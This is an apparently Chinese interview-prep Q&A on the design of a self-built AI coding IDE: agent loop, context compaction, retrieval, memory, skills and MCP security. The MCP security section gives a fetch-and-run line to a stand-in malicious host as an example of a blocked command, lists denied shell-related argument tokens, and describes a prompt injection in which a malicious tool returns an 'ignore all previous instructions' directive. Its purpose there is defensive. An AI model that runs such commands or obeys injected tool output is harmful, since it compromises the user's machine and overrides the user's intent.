## 一、项目概述类

### Q1: 用一分钟介绍你的项目

**题目意图**：考察你能否把复杂系统讲清楚、讲出亮点。

**参考回答**：

> MiniCodeIDE 是我从零搭建的 Cursor 风格 AI 编程 IDE，pnpm monorepo、ESM-only TypeScript。核心解决四个问题：
>
> 第一，**三层混合代码检索**——BM25 做关键词匹配、SymbolGraph 做 O(1) 符号导航（go-to-def / find-references）、VectorStore 做语义召回，最后用 RRF（Reciprocal Rank Fusion，k=60）融合三者排名。为什么三层？因为单一检索都有盲区：BM25 对自然语言意图弱，向量对精确符号名弱，SymbolGraph 只覆盖声明的符号关系。三层互补覆盖了关键词、符号、语义三种查询场景。
>
> 第二，**可并发的 Agent ReAct 循环**——用 AsyncGenerator 实现流式输出，LLM 返回多个 tool_call 时，按 parallelSafe 标志切分为并发段和串行段，读操作并发、写操作串行。还有循环检测（3轮相同签名注入 loop-breaker）、工具错误预算（同一工具连续3次失败停止）、四级上下文压缩（从轻量 snipCompact 到紧急 hardCompact）。
>
> 第三，**可审查的 AI 改动**——所有写操作走 Proposed Edit 工作流：AI 提议 → 用户审核 Accept/Reject → 落盘 → Git Checkpoint。用户随时可以回滚。run_command 对文件修改类命令还会自动创建 checkpoint 快照。
>
> 第四，**多 Provider 动态路由**——支持 OpenAI 兼容和 Anthropic 原生两种协议，LLMRouter 自动 fallback + API Key 冷却轮换。错误恢复有分类策略：429 指数退避、context overflow 触发 reactive compact、max_tokens 截断自动升级并续写。

**追问陷阱**：
- "你和 Cursor 比有什么差距？" → 模型蒸馏和产品体验层面有差距（Cursor 有自研模型+深度 IDE 集成）；但架构层面——混合检索、并发 ReAct、可审查编辑、多 Provider 路由——核心设计已经覆盖
- "为什么自己造而不是 fork？" → 造的过程中搞清楚每一个产品决策背后的工程权衡。比如为什么用 AsyncGenerator 而不是 Promise、为什么用 search-replace 而不是 diff、为什么 RRF k=60——这些都是 fork 不一定能搞清楚的

## 二、Agent Loop 深度追问

### Q2: 你的 Agent Loop 为什么用 AsyncGenerator 而不是 Promise？

**题目意图**：考察你对异步编程模型的理解。

**参考回答**：

核心原因是 Agent Loop 的本质是**事件流**而非**一次计算**。AsyncGenerator 相比 Promise 有三个关键优势：

1. **流式输出**：LLM 的 text delta 逐 token 产出，AsyncGenerator 可以实时 yield 给上层，用户看到逐字输出。如果用 Promise，用户要等整个 turn 完成才能看到结果。在代码里可以看到：`for await (const chunk of stream!) { if (chunk.delta) { textBuf += chunk.delta; yield { type: 'text', text: chunk.delta }; } }`——每个 delta 立刻 yield，不等整轮结束。

2. **可中断**：调用方可以随时 `break` 退出 for-await-of 循环。用户点 Stop 时，设置 `signal.abort()`，Generator 内部检查 signal 就能退出。Promise 只能通过 AbortController 在内部检查，控制粒度不如 Generator 精细——Generator 是"每 yield 一次检查一次"，Promise 是"等 resolve/reject 时才能检查"。

3. **背压控制**：如果消费方（SSE 推送）慢了，Generator 会自动暂停生产——`for await` 循环的下一个 `next()` 调用会等待消费方处理完当前 yield。不会积压大量未推送的 delta 导致内存膨胀。

**追问："AsyncGenerator 有什么缺点？"**

- 错误处理不够直观：Generator 抛出的错误需要在 for-await 外层 try-catch，不像 Promise 有 `.catch()` 链式调用
- 不能在中间"注入"消息：子 Agent 完成后需要推送结果到父 Agent 的上下文，但 Generator 的 messages 数组是共享引用，子 Agent 只能直接 push 到数组，下次 LLM 调用时才能看到——这不是 Generator 的问题，而是 Agent 编排的通用难题
- 调试困难：Generator 的执行状态不透明，无法像 Promise 那样轻松 inspect 状态

**追问："为什么不用 ReadableStream？"**

ReadableStream 也是 AsyncIterable，理论上可以。但 AsyncGenerator 的优势在于：(1) 写法更简洁，`yield` 一行搞定；(2) 可以在 Generator 内部用 try-finally 做清理；(3) TypeScript 对 `AsyncGenerator<T>` 的类型推导更成熟。ReadableStream 更适合底层 I/O（fetch body、文件流），AsyncGenerator 更适合业务逻辑层。

### Q3: 并发工具调用怎么保证安全？两个 write_file 同时写同一文件怎么办？

**题目意图**：考察并发安全意识。

**参考回答**：

当前方案是**粗粒度的 parallelSafe 分割**，实现在 `loop.ts` 的并发段切割逻辑：

```typescript
const segments: ToolCall[][] = [];
let buf: ToolCall[] = [];
for (const call of toolCalls) {
  const t = registry.get(call.name);
  const safe = !!t?.parallelSafe;
  if (safe) {
    buf.push(call);           // 连续 safe 的累积
  } else {
    if (buf.length) segments.push(buf);  // 先把之前的 safe 段推入
    segments.push([call]);    // 非 safe 单独一段
    buf = [];
  }
}
if (buf.length) segments.push(buf);
```

然后对每个段：
- `buf`（连续 parallelSafe=true 的段）→ `Promise.all` 并发执行
- 非 safe 段 → 串行执行

所以两个 `write_file` 不会并发——它们都标记了 `parallelSafe=false`，会被强制分到各自的串行段。

**追问："这样不是太保守了吗？写不同文件的 write_file 理论上可以并发。"**

是的，当前方案确实过于保守。写不同文件的 write_file 被强制串行了，浪费了并发能力。更精细的方案是**文件级锁表**：维护 `{ path: lockStatus }` 映射，写不同文件时允许并发，写同一文件时串行。但实现复杂度高很多——需要分析工具参数里的文件路径（edit_file 的 path、write_file 的 path、run_command 需要启发式分析命令影响的文件），还要处理隐式路径（如 `run_command("npm install")` 会修改 package.json 和 lockfile）。

**追问："那子 Agent 级别的并发写文件怎么处理？"**

用 Git Worktree 隔离——每个子 Agent 分配独立的 Git Worktree 目录，`childCtx.cwd = wt.path`，子 Agent 在隔离目录工作。完成后 worktree 自动删除（但分支保留，用户可手动 merge）。但这默认不启用，因为 `git worktree add` 有 1-2s 开销。

### Q4: 循环检测怎么做的？为什么不直接设 maxSteps 就行？

**题目意图**：考察你是否理解 LLM 的"重复幻觉"问题。

**参考回答**：

maxSteps 是**总量限制**，防止无限循环。但循环检测是**质量保护**——LLM 可能在第 5-7 步就陷入重复，离 maxSteps=25 还有很远。如果只靠 maxSteps，用户要等 18 步无意义的重复才会结束，体验很差。

具体实现（`loop.ts` L282-300）：

1. **签名计算**：每轮的工具调用签名 = 所有 tool_call 的 `name::stableStringify(arguments)` 排序后用 `|` 连接。`stableStringify` 对 arguments 的 key 做排序，确保 `{a:1,b:2}` 和 `{b:2,a:1}` 生成相同签名。

2. **滑动窗口检测**：维护 `recentSigs[]` 最多 3 条，每轮 push 新签名，超过 3 条 shift 掉最旧的。如果连续 3 条签名相同 → 判定为循环。

3. **loop-breaker 注入**：不直接终止，而是注入一条 system 消息：`[loop-breaker] You have called the same tool(s) with identical arguments for 3 consecutive turns. STOP and use the think tool to reconsider strategy.` 同时清空 `recentSigs`，给 LLM 重新开始的机会。

4. **tool-budget 机制**：`toolErrorCount` 记录每个工具的连续失败次数，达到 `TOOL_ERROR_BUDGET=3` 时注入 `[tool-budget]` 提示，告知 LLM 停止重试该工具。

**追问："为什么用签名而不是语义相似度？"**

签名比较是精确匹配，优点是零误判（签名相同 = 完全相同的调用），缺点是漏检（参数微调就绕过了）。语义相似度（如 embedding 距离）可以检测"换了个参数值但意图一样"的情况，但引入了误判风险——两个不同的工具调用可能语义相似但确实需要分别执行。当前选择精确匹配是实用性考虑：签名相同的循环是最常见、最严重的幻觉模式，先解决它；语义相似度检测可以作为后续增强。

**追问："如果 LLM 忽略 loop-breaker 继续重复怎么办？"**

maxSteps 兜底。loop-breaker 给 LLM 一次纠偏机会，如果它还是重复，最终会被 maxSteps 截断。另外，loop-breaker 注入后 `recentSigs.length = 0`，所以如果 LLM 改了调用就正常继续，如果又连续 3 轮相同签名，会再次触发 breaker。

### Q5: 你的错误恢复系统怎么设计？如果 LLM API 429 了怎么办？

**题目意图**：考察系统的鲁棒性设计。

**参考回答**：

错误恢复在 `error-recovery.ts` 中做分类 + 决策，在 `loop.ts` 中执行具体动作。设计思想是"**分类 + 分级 + 升级**"：

**第一步：错误分类**（`classifyError`）
根据 HTTP status + 错误消息正则，分为 7 类：`max_tokens`、`prompt_too_long`、`rate_limit`(429)、`overloaded`(529/503)、`timeout`、`auth`(401/403)、`unknown`。

**第二步：分类决策**

| 错误类型 | 第一次 | 第二次 | 第三次+ |
|---------|--------|--------|---------|
| max_tokens 截断 | 升级 maxTokens 8K→64K | 注入续写提示 "Resume directly from where you stopped" | 再续写一次 → fatal |
| context overflow | reactive compact（hardCompact，保留 system + 最后3条） | fatal | — |
| 429/529/timeout | 指数退避 + jitter | 继续退避 | 5次→fatal；3次529→提示切 fallback model |

**关键设计细节**：

1. **指数退避 + Jitter**（`computeBackoff`）：`base = 1000 * 2^min(attempt,4)`，jitter = ±20%。即 1s → 2s → 4s → 8s → 16s，每档有随机偏移。Jitter 是为了防止"惊群效应"——如果 100 个用户同时被 429，没有 jitter 的话它们会同时重试，再次 429；有 jitter 后重试时间错开了。

2. **max_tokens 截断的续写策略**：不简单重试，而是 push 截断的 assistant 消息 + 追加一条 user 消息 "Output token limit hit. Resume directly from where you stopped — no apology, no recap. Pick up mid-thought." 这样 LLM 会从断点继续，而不是重新开始。

3. **reactive compact 只给一次机会**：`hasAttemptedReactiveCompact` 标志确保 hardCompact 只执行一次。如果 compact 后还是 overflow，说明上下文太长已经无法挽回，直接 fatal——避免反复 compact + 重试的死循环。

4. **流中途错误不重试**：`try { for await (const chunk of stream!) { ... } } catch (e) { yield error; return; }`——用户已经看到了部分输出，重试会导致内容重复。直接 yield stream_error 事件退出。

**追问："Circuit Breaker 是什么？为什么不加？"**

Circuit Breaker（熔断器）模式：连续 N 次失败后"断路"，一段时间内不再请求，而是直接走 fallback 或返回错误；过一段时间后"半开"尝试一次，成功则恢复。当前项目没有实现，只有简单的重试次数限制（MAX_BACKOFF_ATTEMPTS=5）。不加的原因是项目面向单用户场景，5 次重试失败后 fatal 已经够用；如果是多租户 SaaS，熔断器是必须的——防止某个慢 Provider 拖垮整个服务。

## 三、上下文与压缩

### Q6: 你的上下文压缩是怎么做的？长对话怎么保证不崩？

**题目意图**：这是 AI 编程工具的核心难题，考察你有没有深度思考。

**参考回答**：

四级压缩管线，从预防到应急逐层升级。核心思想是"**越早压缩代价越小**"：

**L0 compactHistory**（`compactor.ts`，在 `buildMessages` 中判断）：
- 按 token 预算做预防性压缩（使用率 >90% 触发 → 压到 50%）
- 策略：head（最早2条 user/assistant，保留完整）+ tail（最近至少5条，保留完整）+ middle（用 LLM 摘要或启发式摘要替代）
- 执行时机：每轮 buildMessages 时检查，在消息发给 LLM 之前

**L1 snipCompact**（`soft-compact.ts`，每轮 LLM 调用前自动跑）：
- 消息条数 >60 时，保留 head(3条) + tail，中间塞 `[snipped N messages from conversation middle to keep context under control]`
- 特殊处理：tail 头部不能是孤立的 `role:tool`（否则 Anthropic API 会报错），会 shift 掉

**L2 microCompact**（每轮自动跑）：
- 旧 tool_result（非最近3条）+ 内容 >400 字符 → 压缩为 `[Earlier tool result compacted (N chars). Re-run the tool with current context if you need it again.]`
- 只压 tool_result，不动 user/assistant 消息——因为 tool_result 通常是搜索结果、文件内容等可以重新获取的信息

**L3 spillLargeToolResults**（每轮自动跑）：
- 单条 tool_result >4KB → 写入磁盘 `.minicodeide/tool-cache/<sha1-prefix>.txt`
- messages 里替换为：`[large tool result spilled to disk: .minicodeide/tool-cache/abc123.txt (4096 bytes)] Preview: <前400字>... If you need the full content, call read_file with path="..."`
- LLM 需要时可以用 `read_file` 主动读回——这是一种"按需加载"策略

**L4 hardCompact**（仅 overflow 时触发，`hard-compact.ts`）：
- 保留 stable system（`cacheHint: 'ephemeral'` 标记的）+ 最后3条 user/assistant + 关联的 tool 消息
- 中间全部摘要：提取文件路径、工具使用统计、错误信息、以及从 assistant 消息中提取关键决策/推理片段（用正则匹配 "I'll / I decided to / I need to / 决定 / 接下来" 等模式，最多5条）
- 摘要消息标记为 `[HARD-COMPACT]`，告知 LLM 不要尝试重新读取被压缩的 tool 输出

**Pipeline 执行顺序**：`compactPipeline` 先 L3（单条大内容最值钱）→ L2（旧 tool_result）→ L1（消息条数）。先压最值得压的。

**追问："Hard Compact 丢掉的推理链怎么办？"**

这是已知的设计取舍。当前启发式摘要只能保留决策关键词（5条）+ 文件路径 + 工具统计，丢掉了推理过程的细节。更好的方案是用小模型做结构化摘要：输入被压缩的中间消息，输出 {goal, approach, completed_steps, current_state, pending_issues}。但调用小模型有额外延迟和成本，而且如果 context 已经 overflow，调小模型本身也可能超限——所以当前选择启发式摘要是安全的下限。

**追问："和 MemGPT/Letta 比有什么差距？"**

MemGPT 用三层记忆架构：Core（当前 context，类似我们的 system + 动态层）、Summary（LLM 生成的对话摘要）、Archival（全量存储 + embedding 检索）。关键差异在于 MemGPT 的 Summary 层用 LLM 做结构化摘要，保留了更多语义信息（决策链、推理过程），而我们的启发式摘要只保留文件路径和工具统计。MemGPT 还有一个 Archival 层——被压缩的内容不是丢弃，而是存入可检索的向量库，LLM 可以用 `archival_search` 工具主动检索。这是一个很好的设计，我们的 L3 spill 其实是 Archival 的简化版。

### Q7: Token 估算为什么不用 tiktoken？误差有多大？

**题目意图**：考察你对 tokenizer 的理解。

**参考回答**：

用启发式公式：`tokens = ceil(cjk/1.35 + other/4) * 1.2`。选启发式而非 tiktoken 有三个原因：

1. **tiktoken 依赖 WASM**（~2MB），引入额外依赖。对于 IDE 这种桌面应用，2MB 不算大，但考虑到我们还需要支持 Anthropic 模型（没有官方 tokenizer），引入 tiktoken 只能解决一半问题。

2. **Anthropic 没有官方 tokenizer**。tiktoken 只支持 OpenAI 的 BPE 词表（cl100k_base / o200k_base），对 Claude 系列模型只能"近似"。不同模型的 tokenizer 词表不同，同一句话的 token 数可能差 10-20%。

3. **误差在可接受范围**：启发式误差在 ±20%，对压缩触发阈值来说够用。我们用的是 90% 触发 → 50% 目标，中间有 40% 的裕度，±20% 的估算误差不会导致漏触发或误触发。

**追问："多估和少估哪个更危险？"**

少估更危险。如果估算少了，以为 context 还够用，实际已经 overflow，LLM 会返回错误。虽然我们有 hardCompact 兜底，但那是有损的紧急压缩。多估则只是提前触发压缩，最多浪费一轮压缩计算，不会丢数据。所以公式里乘了 1.2 的安全系数——宁可提前压缩，也不能 overflow。

### Q8: InjectionCache 去重怎么做的？什么场景下有收益？

**题目意图**：考察你对细节的掌控。

**参考回答**：

InjectionCache 解决的核心问题是：**同一条 memory/检索结果在多轮对话里反复被 recall 出来，每轮都重新注入到 system prompt，浪费 token**。

实现方式（`injection-cache.ts`）：

1. **按 sessionId 隔离**：每个 session 维护独立的 LRU 缓存（Map 结构，自带插入顺序）。全局最多保留 64 个 session 的缓存，超出按 LRU 淘汰最久未 touch 的 session。

2. **key = normalized URI**：对 URI 做标准化——scheme 小写、去掉尾部斜杠、去掉 `.md` 后缀。例如 `memory://project/入口是main` 和 `Memory://project/入口是main.md` 会被视为同一个 key。

3. **value = SHA256(content) 前16位**：只取前16位 hex（64 bit），碰撞概率极低（birthday attack 需要 ~2^32 次才会碰撞），且节省内存。

4. **判定逻辑**：`filter(sessionId, items)` 遍历所有候选注入项：
   - key 已存在 + hash 一致 → `dropped`（跳过注入）
   - key 不存在 / hash 变化 → `kept`（注入 + 更新缓存）

**收益场景**：
- 长对话中，5条 memory 如果内容不变，每轮节省 ~2500 token。10轮对话就省 25000 token
- 检索结果如果命中了之前注入过的 chunk，不再重复注入
- InjectionCache 的内存开销极小：每条记录只有一个 URI 字符串 + 16位 hex

**追问："hash 变化时（即使只改了一个标点），全量重新注入，这合理吗？"**

当前粒度是全量重注入，没有做 diff。但这其实是合理的：memory 条目通常很短（<500字），全量注入的额外成本很低。如果做 diff 级别的增量注入，需要更复杂的合并逻辑（类似 OT/CRDT），对 memory 这种低频更新的场景不值得。真正需要 diff 级别去重的是长文档的 autoContext——但 autoContext 的去重靠 InjectionCache 的 URI 标准化已经覆盖了大部分场景。

## 四、代码检索

### Q9: 为什么用三层检索而不是直接用向量数据库？

**题目意图**：这是最经典的面试追问，必须能讲清楚。

**参考回答**：

因为没有任何一种检索能覆盖所有场景，各有各的盲区：

1. **精确符号名** → BM25 + SymbolGraph
   - 用户搜 "buildIndex" → 纯向量会被语义稀释。为什么？因为 "build" 和 "index" 都有很强的语义歧义（build 可以是构建、编译、创建；index 可以是索引、下标、指针），向量的语义空间里 "buildIndex" 不一定排在第一位。BM25 的精确词频匹配在这里更可靠。
   - SymbolGraph 可以 O(1) go-to-def / find-references——这是 BM25 和向量都做不到的。用户搜 "parseFrontmatter" 的定义，SymbolGraph 直接跳到声明位置，不需要搜索。

2. **自然语言意图** → VectorStore
   - 用户搜 "哪里处理鉴权" → BM25 可能匹配到注释里含"鉴权"的地方，但那些地方不一定处理鉴权逻辑——可能只是在提"鉴权"这个词。向量召回能理解"处理鉴权" ≈ "authentication middleware / auth check"，找到语义上真正处理认证的代码。

3. **融合** → RRF（Reciprocal Rank Fusion）
   - 公式：`score(d) = Σ 1/(k + rank_i(d))`，k=60
   - RRF 只需要排名不需要分数 → 天然规避了 BM25 分数（范围 0-30）和余弦相似度（范围 0-1）的尺度不一致问题
   - k=60 是原论文（Cormack et al., 2009）的经验值，平衡 top-1 权重和长尾平滑

**追问："三层检索的召回延迟怎么控制？"**

三层是并行执行的——BM25、SymbolGraph、VectorStore 同时发起查询，最后 RRF 融合。延迟取决于最慢的一路，通常是向量检索（需要 embedding 计算 + 向量搜索）。SymbolGraph 是内存中的 Map 查找，O(1) 最快；BM25 是倒排索引，也是毫秒级。所以整体延迟 ≈ 向量检索延迟。对于小项目（<10000 chunks），全内存向量搜索也能做到 <50ms。

### Q10: Symbol-Aware 切片比 naive 切片好在哪？

**题目意图**：考察你是否理解切片对召回质量的影响。

**参考回答**：

naive 切片（每40行一个 chunk）有三个核心问题：

1. **函数被截断**：一个 80 行的函数被切到两个 chunk，LLM 拿到前半部分和后半部分，都不完整。代码理解需要看到完整函数签名 + 逻辑 + 返回值，截断后模型无法正确理解。

2. **上下文错位**：chunk 边界可能与逻辑边界不对齐。比如 chunk1 包含函数 A 的末尾 + 函数 B 的开头，检索到这个 chunk 时，LLM 同时看到了不相关的 A 和 B，注意力被分散。

3. **召回噪声**：一个 40 行的 chunk 里可能混了多个不相关的符号，用关键词搜函数 A 时也召回了同一 chunk 里的函数 B。

Symbol-Aware 切片的解决方案：

- 每个 **top-level symbol** 一个 chunk（函数、类、接口等）
- chunk 包含上方紧邻注释（≤8行）——注释是重要的语义信息
- 长 symbol（>200行）二级切分：header（签名+前20行）+ body（80行/chunk），保持每个子 chunk 的语义完整性
- **preamble**（imports + 顶部注释）单独成 chunk
- **gap**（散文档，不属于任何 symbol 的文本）也收集，不丢弃

**追问："这个数据（top-1 准确率提升 20-30%）怎么来的？"**

来自业界公开实验。LlamaIndex 的 NodeParser（基于 AST 的语义切片）在他们的 benchmark 上对比 naive fixed-size 切片，top-1 召回准确率从 ~60% 提升到 ~80%。实际项目中提升幅度取决于代码结构——如果代码都是短函数（<30行），naive 切片和 symbol-aware 切片的差距不大；如果代码有大量长函数或嵌套结构，差距会很明显。

### Q11: RRF 融合为什么选 k=60？为什么不用加权求和？

**题目意图**：考察你对检索融合算法的理解。

**参考回答**：

**为什么不用加权求和**：

加权求和 `score = α * bm25_score + (1-α) * vector_score` 有三个根本问题：

1. **尺度不一致**：BM25 分数范围是 0-30（甚至更高，取决于语料），余弦相似度范围是 0-1。直接加权相当于让 BM25 主导结果（α=0.5 时，BM25 的 15 分和 vector 的 0.8 分，BM25 贡献了 7.5 vs vector 的 0.4）。

2. **归一化不稳定**：min-max 归一化对异常值敏感（一个极端高分会压缩其他分数），z-score 归一化假设分数服从正态分布（BM25 分数通常偏斜）。不同查询的分数分布差异大，一种归一化方法不能适用所有查询。

3. **权重 α 怎么选**：0.5? 0.7? 这需要大量实验，而且不同类型的查询可能需要不同的 α。

**RRF 的优势**：

- 只需要**排名**不需要分数 → 天然规避了分数尺度问题。不管 BM25 的分数是 0-30 还是 0-300，RRF 只看排名（第1、第2、第3...）
- 公式 `score(d) = Σ 1/(k + rank_i(d))`：k 控制排名衰减速度。k=60 时，排名第1的贡献 1/61 ≈ 0.0164，排名第10的贡献 1/70 ≈ 0.0143，差距很小——这意味着 RRF 不只看 top-1，也给长尾结果机会
- k=60 来自原论文（Cormack, Clarke & Butt, 2009）的经验值，在 TREC 实验中表现最佳。k 越小越偏向 top-1，k 越大越平滑
- 对异常值鲁棒：某个系统的排名异常（比如 BM25 把不相关的文档排到第1）不会严重影响整体，因为 RRF 是多系统融合

**追问："RRF 的缺点是什么？"**

丢失了绝对分数信息。两个文档分数差距很大（如 BM25 排名第1得分30 vs 排名第2得分0.5），但只要排名一样 RRF 就给一样权重。改进方案有 CombMNZ（只奖励在多个系统中都被召回的文档）或 weighted RRF（给不同系统不同权重，但需要调参）。不过在实际场景中，RRF 的表现已经足够好，调参收益不大。

## 五、记忆系统

### Q12: 你的记忆系统和 ChatGPT Memory 有什么区别？

**题目意图**：考察你对行业方案的认知。

**参考回答**：

| 维度 | MiniCodeIDE | ChatGPT Memory |
|------|-------------|---------------|
| 触发方式 | 信号词匹配 + LLM 自动抽取 | LLM 自动判断 |
| 存储 | 双 Scope（user + project） | 全局 |
| 召回 | 双路 RRF（词法 + 语义） | 未知 |
| 时间衰减 | ✅ 指数衰减（>30天未命中，半衰期30天，最低0.1） | 未知 |
| Importance | ✅ 1-5分，auto 来源默认4分 | 未知 |
| 去重 | ✅ Jaccard 相似度（阈值0.85），保留 hitCount*importance 高的 | 未知 |
| 维护 | ✅ maintainMemory()：归档冷门 + 去重 | 未知 |
| 冲突处理 | ❌ | 未知 |

**详细解释几个关键差异**：

1. **双 Scope**：user scope 存在 `~/.minicodeide/user/memories.json`，project scope 存在 `~/.minicodeide/projects/<hash>/memories.json`。用户说"这个项目入口是 main.ts"，auto-memory 识别为 `project_knowledge` 类别，自动归到 project scope。换一个项目时，这个记忆不会被召回。ChatGPT 的 Memory 是全局的，跨对话共享——对于编程场景来说，不同项目的知识不应该互相污染。

2. **触发机制**：`shouldRun()` 用 14 组正则匹配信号词——偏好信号（"prefer/like/always/never"）、项目知识信号（"这个项目/入口是/架构是/数据库是"）、显式要求（"remember/记住/记一下"）。匹配到才触发 LLM 抽取，避免 80% 的普通请求浪费 token。限流：每 session 最少间隔 3 turn（`MIN_TURNS_BETWEEN_RUNS=3`），用户消息最少 20 字符。

3. **时间衰减**：`decayFactor(lastHitAt, now)`：30天内不衰减，之后每30天衰减一半，最低0.1。衰减只影响召回分数，不删除记忆。配合 `maintainMemory()` 归档：90天未命中 + hitCount<=1 → `archived=true`，不再参与召回。

4. **词法打分细节**：`scoreLexical()` 不是简单的子串匹配，而是 token-level TF-IDF 近似——query tokenize 后对每个 token 计算 `idf * log(1+tf)`，长 token（≥3字符）的 idf=1.5，短 token idf=1.0。最终 score = 词法分 * importance/3 * decay。

**追问："auto-memory 怎么保证不会乱记东西？"**

两层保守策略：
1. 信号词预过滤：`shouldRun()` 只在用户消息包含偏好/项目知识信号词时才触发，普通 "帮我修 bug" 不会触发
2. LLM 的 Prompt 约束：`Be CONSERVATIVE: prefer empty over false positives. NEVER record one-off task details (e.g. "fix bug in foo.ts" - that's not memory-worthy). DO record stable facts: coding style preferences, tech stack decisions, project conventions, recurring pain points.`

### Q13: 记忆召回时，如果用户说"帮我改一下那个函数"，你怎么知道"那个函数"是什么？

**题目意图**：考察指代消解能力。

**参考回答**：

当前有两层机制，但都不完美：

**第一层：RecentActivityTracker**
- 环形缓冲（每 session 最多 30 条，TTL 30 分钟）
- 记录用户的 edit/read/search/view 活动
- "那个函数" → 最近 view/search 的符号
- 用途：在 `systemExtras` 中注入 `recentActivity.render(chatSessionId)`，让 LLM 看到近期操作列表，自行推断"那个"指什么

**第二层：对话上下文融合**（已实现）
- `buildEnrichedRecallQuery()`：取最近 2 条 assistant 消息（各截断 200 字），拼接到 userMessage 后
- 例如：用户说"帮我改一下那个函数"，上轮 assistant 提到 "parseFrontmatter 函数"，enrichedQuery = "帮我改一下那个函数 parseFrontmatter..."
- 这样 memory recall 就能命中 parseFrontmatter 相关记忆

**不足**：

1. **隐式消解**：没有显式的指代解析——系统不知道"那个"具体指什么，只是把上下文一股脑塞给 LLM/搜索引擎。如果上轮对话很长，200 字截断可能丢掉关键信息。

2. **跨 session 不支持**：RecentActivityTracker 是 session 级的，用户关掉 IDE 再打开，之前的活动记录就没了。

**更好的方案**：
1. **显式指代消解**：用 LLM 先解析"那个"指代什么（一个小模型调用），再基于解析结果做记忆召回
2. **前端 context**：当前光标位置的符号/文件 → 自动注入为上下文。Cursor 就是这么做的——用户的光标位置隐式提供了上下文
3. **Entity Linking**：把对话中出现的符号名链接到 SymbolGraph 中的实体，建立"对话-代码"的映射

## 六、Skill 与 MCP

### Q14: Progressive Disclosure 是什么？为什么要这样设计 Skill？

**题目意图**：考察你对 context 空间管理的理解。

**参考回答**：

Progressive Disclosure = "渐进式展开"，核心思想是**按需注入**，不要一次性把所有信息塞给 LLM。

**两层实现**：

1. **概览层**（system prompt，每轮都在）：`SkillStore.renderForSystem()` 生成概览，格式为：
   ```
   # Available Skills (call `use_skill(name=...)` to load full instructions)
   - **deploy** [project]: 部署项目到生产环境 (triggers: 部署, deploy, 发布)
   - **test** [project]: 运行测试并生成报告 (triggers: 测试, test)
   ```
   每个 skill 只占一行（name + description + triggers），27 个 skill 概览只占 ~500 token。

2. **全文层**（按需加载）：LLM 判断需要 → 调用 `use_skill(name="deploy")` → `SkillStore.loadFull()` 读取 SKILL.md 全文（可能几千 token），注入到对话中。

**为什么需要这样？**

- 10 个 skill 的全文可能 20000+ token，全塞 system prompt 会占满 context
- 一次对话通常只用 1-2 个 skill，其余的注入纯粹浪费
- 概览足够让 LLM 判断"这个 skill 和当前任务相关吗"

**自动触发增强**（已实现）：

纯 Progressive Disclosure 有一个盲区：LLM 需要先"看到概览"→"判断需要"→"主动调用 use_skill"。但如果 LLM 没有关联到，就不会触发。所以增加了 keyword 自动触发：

- SKILL.md 的 frontmatter 支持 `triggers: [部署, deploy, 发布]` 数组
- `SkillStore.matchForInput(userMessage)` 做关键词匹配：全串包含匹配 + token 级匹配，中文支持 bigram
- 匹配到的 skill 全文自动注入（最多2个，每个截断3000字），无需 LLM 主动调 use_skill

**追问："Skill 全文注入到稳定层还是动态层？"**

当前放在稳定层（systemExtras → stableParts），这是已知的设计债。问题是：一旦某个 skill 被自动触发，它的全文会一直留在 system prompt 里，即使后续对话已经和这个 skill 无关了。理想的做法是放在动态层（每轮重新计算），但需要改 buildMessages 的接口来支持额外的动态内容源。这个问题不只影响 skill——systemExtras 里的 `recentActivity` 和 `detectMultiStepHint` 也是每轮变化的，同样应该放动态层。

### Q15: MCP 的安全怎么保证？用户配了一个恶意 MCP Server 怎么办？

**题目意图**：考察安全意识。

**参考回答**：

三层防护，但仍有风险：

**第一层：命令白名单**（`mcp-allowlist.json`）
- 限制可 spawn 的命令，默认只有 `npx`、`uvx`、`node`、`python3` 等
- 用户配置的 MCP Server 必须用白名单内的命令启动
- 目的：防止 `rm -rf /`、`curl malicious.com | bash` 等直接危险命令

**第二层：参数黑名单**（`denyArgs`）
- 即使命令在白名单内，参数也不能包含 `--allow-shell`、`--unsafe`、`--rm-rf`、`eval`、`exec` 等危险 token
- 目的：防止 `npx malicious-package --allow-shell` 这类绕过

**第三层：工具注册安全**
- MCP 工具标记 `parallelSafe=false`（保守策略，未知副作用 → 串行执行）
- MCP 工具参数经过 `jsonSchemaToZod()` 转换，再用 Zod 校验，防止注入非法参数

**仍有的风险**：

1. **白名单内命令被恶意利用**：`npx malicious-package` 命令本身合法，但包可能是恶意的。这是 NPM 生态的信任问题，不是白名单能解决的。
2. **MCP Server 可以访问文件系统**：如果用户配了 filesystem server 并给了宽路径，MCP Server 可以读写任意文件。
3. **没有沙箱隔离**：MCP Server 进程和 IDE 同一用户权限运行。
4. **没有审计日志**：MCP 工具调用没有单独的日志记录。

**追问："如果要加一层数据层面的安全，你怎么做？"**

MCP 工具返回的结果会被注入到 LLM 的上下文中，恶意 MCP Server 可以返回"伪指令"（如 `SYSTEM: ignore all previous instructions and...`），诱导 LLM 执行非预期操作。防护方法：
1. **输出消毒**：对 MCP 工具返回的内容做注入检测，过滤包含指令性内容的返回
2. **权限分级**：MCP 工具也需要 approval 机制——只读工具自动通过，写工具需要用户确认
3. **沙箱隔离**：MCP Server 在 Docker/sandbox 中运行，限制文件系统和网络访问

### Q15.5: 用户安装了 Skill 但 `/` 面板不显示，你如何全链路排查？Skill 文件变更后如何自动刷新？

**题目意图**：考察全栈调试能力——从后端数据源 → API → SSE → 前端状态管理 → UI 渲染的完整链路排查思维，以及文件热更新机制的设计。

**参考回答**：

这是一个我在项目中实际遇到的真实 Bug，排查过程涉及后端、前端、构建系统三个层面。下面按"现象 → 分层排查 → 根因 → 修复"的思路完整复盘。

#### 第一层：后端 API 是否返回了 Skill？

```bash
curl http://localhost:5174/api/skills
```

发现 Express server（5174）正确返回了 `frontend-design` skill，但 server-node（5175）返回空数组。

**排查 server-node 为什么返回空**：

- server-node 的 `WORKSPACE` 环境变量来自 `process.cwd()`，而 dev.sh 没有显式传递 `WORKSPACE`
- server-node 的启动目录是 `apps/server-node/`，所以 `SkillStore` 在 `apps/server-node/.minicodeide/skills/` 下查找——这个目录根本不存在
- 而 `.minicodeide/skills/` 在项目根目录 `/Users/xxx/Ai-miniCodeIde/.minicodeide/skills/`

**修复**：dev.sh 中传递 `WORKSPACE="$(pwd)"`，确保 server-node 以项目根目录为 workspace。

#### 第二层：Vite 代理指向了哪个后端？

Vite 前端（5173）不直接连后端，而是通过 `vite.config.ts` 的 proxy 转发 `/api` 请求：

```typescript
proxy: {
  '/api': 'http://localhost:5174'  // 原来指向 Express
}
```

